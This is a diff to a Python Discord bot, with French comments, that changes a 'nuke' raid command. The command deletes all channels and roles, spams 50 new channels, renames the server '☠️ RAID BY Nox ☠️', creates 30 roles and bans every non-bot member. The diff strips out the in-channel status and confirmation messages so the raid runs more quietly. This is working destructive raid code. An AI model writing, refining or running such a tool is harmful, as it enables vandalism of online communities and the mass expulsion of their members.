@@ -16,8 +16,8 @@ async def on_ready():
 @bot.command()
 async def nuke(ctx):
     if ctx.author.guild_permissions.administrator:
-        await ctx.send("Nuke en cours...")
-        
+        # Pas de message de vérification ici
+
         # Supprimer salons et rôles (avec pauses)
         try:
             # Supprimer tous les salons
@@ -41,8 +41,6 @@ async def nuke(ctx):
                     except Exception as e:
                         print(f"Erreur lors de la suppression du rôle {role.name}: {str(e)}")
 
-            await ctx.send("Salons et rôles supprimés avec succès !")
-
             # Créer 50 salons et envoyer 5 messages dans chaque salon
             for i in range(50):
                 try:
@@ -58,16 +56,12 @@ async def nuke(ctx):
                 except Exception as e:
                     print(f"Erreur lors de la création du salon ou de l'envoi des messages : {str(e)}")
 
-            await ctx.send("50 salons créés et messages envoyés avec succès !")
-
             # Renommer le serveur
             try:
                 await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")
                 print("Serveur renommé avec succès.")
-                await ctx.send("Serveur renommé avec succès !")
             except Exception as e:
                 print(f"Erreur lors du renommage du serveur : {str(e)}")
-                await ctx.send(f"Erreur lors du renommage du serveur : {str(e)}")
 
             # Créer 30 rôles
             for i in range(30):
@@ -77,8 +71,6 @@ async def nuke(ctx):
                     await asyncio.sleep(0.5)  # Petite pause pour éviter de trop solliciter Discord
                 except Exception as e:
                     print(f"Erreur lors de la création du rôle {i+1}: {str(e)}")
-            
-            await ctx.send("30 rôles créés avec succès !")
 
             # Bannir tous les membres sauf les bots
             for member in ctx.guild.members:
@@ -91,12 +83,9 @@ async def nuke(ctx):
                     print(f"Erreur lors du bannissement du membre {member.name}: {str(e)}")
 
             print("Nuke terminé.")
-            await ctx.send("Le nuke est terminé. Tous les membres ont été bannis.")
-
         except Exception as e:
-            await ctx.send(f"Une erreur est survenue pendant le nuke : {str(e)}")
             print(f"Erreur : {str(e)}")
     else:
-        await ctx.send("Tu n'as pas la permission d'utiliser cette commande.")
+        print("Le membre n'a pas la permission d'exécuter cette commande.")
 
 bot.run(os.getenv("TOKEN"))
